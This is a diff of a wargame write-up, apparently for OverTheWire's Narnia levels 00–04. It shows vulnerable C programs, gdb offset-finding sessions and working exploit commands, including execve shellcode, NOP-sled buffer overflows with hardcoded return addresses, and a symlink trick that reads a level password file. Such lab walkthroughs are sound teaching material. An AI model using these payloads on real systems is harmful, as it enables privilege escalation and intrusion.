@@ -19,31 +19,31 @@ the exercises yourself (or find them elsewhere :))
 Level 00 ##
 -----------
 
-.. code:: c
+.. code-block:: c  "linenos=table"
 
-    #include <stdio.h>
-    #include <stdlib.h>
-
-    int main(){
-            long val=0x41414141;
-            char buf[20];
-
-            printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
-            printf("Here is your chance: ");
-            scanf("%24s",&buf);
-
-            printf("buf: %s\n",buf);
-            printf("val: 0x%08x\n",val);
-
-            if(val==0xdeadbeef)
-                    system("/bin/sh");
-            else {
-                    printf("WAY OFF!!!!\n");
-                    exit(1);
-            }
-
-            return 0;
-    }
+	#include <stdio.h>
+	#include <stdlib.h>
+	
+	int main(){
+	        long val=0x41414141;
+	        char buf[20];
+	
+	        printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+	        printf("Here is your chance: ");
+	        scanf("%24s",&buf);
+	
+	        printf("buf: %s\n",buf);
+	        printf("val: 0x%08x\n",val);
+	
+	        if(val==0xdeadbeef)
+	                system("/bin/sh");
+	        else {
+	                printf("WAY OFF!!!!\n");
+	                exit(1);
+	        }
+	
+	        return 0;
+	}
 
 Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
 on the stack works, we can exploit the setup on lines 5 and 6. :code:`buf` is a 
@@ -54,7 +54,7 @@ at :code:`val`'s location.
 
 So let's try it
 
-.. code:: console
+.. code-block:: console
 
 	narnia0@melinda:/narnia$ python -c "print 'C'*50" | ./narnia0 
 	Correct val's value from 0x41414141 -> 0xdeadbeef!
@@ -65,7 +65,7 @@ So let's try it
 Right, we can confirm that we are able to change the value of :code:`val`. Let's
 tread a bit more carefully and try to see if we can do it more accurately
 
-.. code:: console
+.. code-block:: console
 
 	narnia0@melinda:/narnia$ python -c "print 'C'*20 + 'BBBB'" | ./narnia0 
 	Correct val's value from 0x41414141 -> 0xdeadbeef!
@@ -77,7 +77,7 @@ So there is no space between :code:`val` and :code:`buf`, therefore 20 character
 further 4 is enough to change val. Let's write in the correct value, reversed of
 course because of the endian notation
 
-.. code:: console
+.. code-block:: console
 
 	narnia0@melinda:/narnia$ python -c "print 'C'*20 + '\xef\xbe\xad\xde'" | ./narnia0
 	Correct val's value from 0x41414141 -> 0xdeadbeef!
@@ -88,7 +88,7 @@ course because of the endian notation
 We did it.... but wait, where's the shell? It's closed, that's where it is. We
 need to keep it open. The trick is to append the :code:`cat` command to the input
 
-.. code:: console
+.. code-block:: console
 
 	narnia0@melinda:/narnia$ (python -c "print 'C'*20 + '\xef\xbe\xad\xde'"; cat) | ./narnia0
 	Correct val's value from 0x41414141 -> 0xdeadbeef!
@@ -104,31 +104,31 @@ need to keep it open. The trick is to append the :code:`cat` command to the inpu
 Level 01 ##
 -----------
 
-.. code:: c
+.. code-block:: c "linenos=table"
 
-    #include <stdio.h>
-
-    int main(){
-        int (*ret)();
-
-        if(getenv("EGG")==NULL){    
-            printf("Give me something to execute at the env-variable EGG\n");
-            exit(1);
-        }
-
-        printf("Trying to execute EGG!\n");
-        ret = getenv("EGG");
-        ret();
-
-        return 0;
-    }
+	#include <stdio.h>
+	
+	int main(){
+		int (*ret)();
+	
+		if(getenv("EGG")==NULL){    
+			printf("Give me something to execute at the env-variable EGG\n");
+			exit(1);
+		}
+	
+		printf("Trying to execute EGG!\n");
+		ret = getenv("EGG");
+		ret();
+	
+		return 0;
+	}
 
 So here we need to set an environment variable named :code:`EGG` to something
 we want executed. We can't just pass :code:`/bin/bash` as it's going to call whatever
 we give it as a function. Ideally we want a shell, so what we need in this case
 is the shellcode to do just that.
 
-.. code:: console
+.. code-block:: console
 
 	narnia1@melinda:/narnia$ export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
 	narnia1@melinda:/narnia$ ./narnia1
@@ -141,24 +141,24 @@ is the shellcode to do just that.
 Level 02 ##
 -----------
 
-.. code:: c
+.. code-block:: c "linenos=table"
 
-    #include <stdio.h>
-    #include <string.h>
-    #include <stdlib.h>
-
-    int main(int argc, char * argv[]){
-        char buf[128];
-
-        if(argc == 1){
-            printf("Usage: %s argument\n", argv[0]);
-            exit(1);
-        }
-        strcpy(buf,argv[1]);
-        printf("%s", buf);
-
-        return 0;
-    }
+	#include <stdio.h>
+	#include <string.h>
+	#include <stdlib.h>
+	
+	int main(int argc, char * argv[]){
+		char buf[128];
+	
+		if(argc == 1){
+			printf("Usage: %s argument\n", argv[0]);
+			exit(1);
+		}
+		strcpy(buf,argv[1]);
+		printf("%s", buf);
+	
+		return 0;
+	}
 
 The biggest clues here are lines 6 and 12. Copying user supplied data
 into a fixed sized array without any bound checking is always asking for 
@@ -173,13 +173,13 @@ of metasploit's one. I'll create a payload big enugh to overflow the
 buffer and then check the value of :code:`EIP`. Pasting that back into the pattern
 generator will tell us at what location in the pattern the string occurs.
 
-.. code:: console
+.. code-block:: console
 
 	local $] ./pattern.py 150
 	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
 	Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
 
-.. code:: console
+.. code-block:: console
 
 	narnia2@melinda:/narnia$ gdb -q narnia2
 	Reading symbols from narnia2...(no debugging symbols found)...done.
@@ -206,7 +206,7 @@ generator will tell us at what location in the pattern the string occurs.
 	fs             0x0	0
 	gs             0x63	99
 
-.. code:: console
+.. code-block:: console
 
 	local $] ./pattern.py 0x37654136
 	Pattern 0x37654136 first occurrence at position 140 in pattern.
@@ -215,7 +215,7 @@ We can control :code:`EIP` with whatever we put at position 140 of our payload. 
 what do we put there? Well for that we need to figure out where the rest of our
 data is going. Using a known payload let's see where our input ends up:
 
-.. code:: console
+.. code-block:: console
 
 	(gdb) run $(python -c "print 'a' * 140 + 'b' * 4")
 	Starting program: /games/narnia/narnia2 $(python -c "print 'a' * 140 + 'b' * 4")
@@ -282,7 +282,7 @@ start with a `nop sled <https://en.wikipedia.org/wiki/NOP_slide>`_ to adjust for
 the memory offset introduced by :code:`gdb`. Then set the :code:`EIP` to somewhere in the middle
 of the sled
 
-.. code:: console
+.. code-block:: console
 
 	narnia2@melinda:/narnia$ ./narnia2 `python -c "print '\x90'*115 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x60\xd8\xff\xff'"`
 	$ whoami
@@ -293,51 +293,51 @@ of the sled
 Level 03 ##
 -----------
 
-.. code:: c
+.. code-block:: c "linenos=table"
 
-    #include <stdio.h>
-    #include <sys/types.h>
-    #include <sys/stat.h>
-    #include <fcntl.h>
-    #include <unistd.h>
-    #include <stdlib.h>
-    #include <string.h> 
-
-    int main(int argc, char **argv){
-     
-            int  ifd,  ofd;
-            char ofile[16] = "/dev/null";
-            char ifile[32];
-            char buf[32];
-     
-            if(argc != 2){
-                    printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
-                    exit(-1);
-            }
-     
-            /* open files */
-            strcpy(ifile, argv[1]);
-            if((ofd = open(ofile,O_RDWR)) < 0 ){
-                    printf("error opening %s\n", ofile);
-                    exit(-1);
-            }
-            if((ifd = open(ifile, O_RDONLY)) < 0 ){
-                    printf("error opening %s\n", ifile);
-                    exit(-1);
-            }
-     
-            /* copy from file1 to file2 */
-            read(ifd, buf, sizeof(buf)-1);
-            write(ofd,buf, sizeof(buf)-1);
-            printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
-     
-            /* close 'em */
-            close(ifd);
-            close(ofd);
-     
-            exit(1);
-    }
-
+	#include <stdio.h>
+	#include <sys/types.h>
+	#include <sys/stat.h>
+	#include <fcntl.h>
+	#include <unistd.h>
+	#include <stdlib.h>
+	#include <string.h> 
+	
+	int main(int argc, char **argv){
+	 
+	        int  ifd,  ofd;
+	        char ofile[16] = "/dev/null";
+	        char ifile[32];
+	        char buf[32];
+	 
+	        if(argc != 2){
+	                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
+	                exit(-1);
+	        }
+	 
+	        /* open files */
+	        strcpy(ifile, argv[1]);
+	        if((ofd = open(ofile,O_RDWR)) < 0 ){
+	                printf("error opening %s\n", ofile);
+	                exit(-1);
+	        }
+	        if((ifd = open(ifile, O_RDONLY)) < 0 ){
+	                printf("error opening %s\n", ifile);
+	                exit(-1);
+	        }
+	 
+	        /* copy from file1 to file2 */
+	        read(ifd, buf, sizeof(buf)-1);
+	        write(ofd,buf, sizeof(buf)-1);
+	        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
+	 
+	        /* close 'em */
+	        close(ifd);
+	        close(ofd);
+	 
+	        exit(1);
+	}
+	
 
 At first glance this looks a bit more complicated. However it is just another
 buffer overflow (line 13 and 22). This time however we don't control the stack, 
@@ -351,14 +351,14 @@ beyond that will get written to the ofile. So the plan is to to create a symlink
 is that the source path's last 16 characters need to be the same as the target.
 So to do this I created the following directory and symlink:
 
-.. code:: console
+.. code-block:: console
 
 	narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
 	narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
 
 Now when we pass that to :code:`narnia3`:
 
-.. code:: console
+.. code-block:: console
 
 	narnia3@melinda:/narnia$ ./narnia3 `python -c "print '/tmp/' + 'x'*27 + '/tmp/narn4'"` 
 	copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
@@ -372,27 +372,27 @@ the double :code:`/tmp` setup.
 Level 04 ##
 -----------
 
-.. code:: c
+.. code-block:: c "linenos=table"
 
-    #include <string.h>
-    #include <stdlib.h>
-    #include <stdio.h>
-    #include <ctype.h>
-
-    extern char **environ;
-
-    int main(int argc,char **argv){
-        int i;
-        char buffer[256];
-
-        for(i = 0; environ[i] != NULL; i++)
-            memset(environ[i], '\0', strlen(environ[i]));
-
-        if(argc>1)
-            strcpy(buffer,argv[1]);
-
-        return 0;
-    }
+	#include <string.h>
+	#include <stdlib.h>
+	#include <stdio.h>
+	#include <ctype.h>
+	
+	extern char **environ;
+	
+	int main(int argc,char **argv){
+		int i;
+		char buffer[256];
+	
+		for(i = 0; environ[i] != NULL; i++)
+			memset(environ[i], '\0', strlen(environ[i]));
+	
+		if(argc>1)
+			strcpy(buffer,argv[1]);
+	
+		return 0;
+	}
 
 MOAR OVERFLOWS. This time you'll notice something at line 6. What this does
 is `store the user environment <http://man7.org/linux/man-pages/man7/environ.7.html>`_.
@@ -400,7 +400,7 @@ This then get zerod out inside :code:`main` to prevent us from storing any shell
 in environment variables. However we might still be able to write :code:`EIP`, so using the
 trusty pattern generator from before
 
-.. code:: console
+.. code-block:: console
 
 	local $] ./pattern.py 300
 	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
@@ -408,7 +408,7 @@ trusty pattern generator from before
 	Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
 	Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
 
-.. code:: console
+.. code-block:: console
 
 	narnia4@melinda:/narnia$ gdb -q ./narnia4 
 	Reading symbols from ./narnia4...(no debugging symbols found)...done.
@@ -424,7 +424,7 @@ trusty pattern generator from before
 	Program received signal SIGSEGV, Segmentation fault.
 	0x316a4130 in ?? ()
 
-.. code:: console
+.. code-block:: console
 
 	local $] ./pattern.py 0x316a4130
 	Pattern 0x316a4130 first occurrence at position 272 in pattern.
@@ -433,7 +433,7 @@ This tells us we have 272 bytes to play with. Plenty of space to construct
 a nopsled and shellcode payload. Let's find out what we need to write into
 :code:`EIP`.
 
-.. code:: console
+.. code-block:: console
 
 	(gdb) r $(python -c "print 'a'*272 + 'bbbb'")
 	Starting program: /games/narnia/narnia4 $(python -c "print 'a'*272 + 'bbbb'")
@@ -498,7 +498,7 @@ the same shellcode as before, and finish with an address that sits comfortably
 in the sled. You normally need to play with the address a bit, as the offsets
 inside *gdb* are a bit different.
 
-.. code:: console
+.. code-block:: console
 
 	narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*(272-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x30\xd8\xff\xff'"`
 	$ whoami
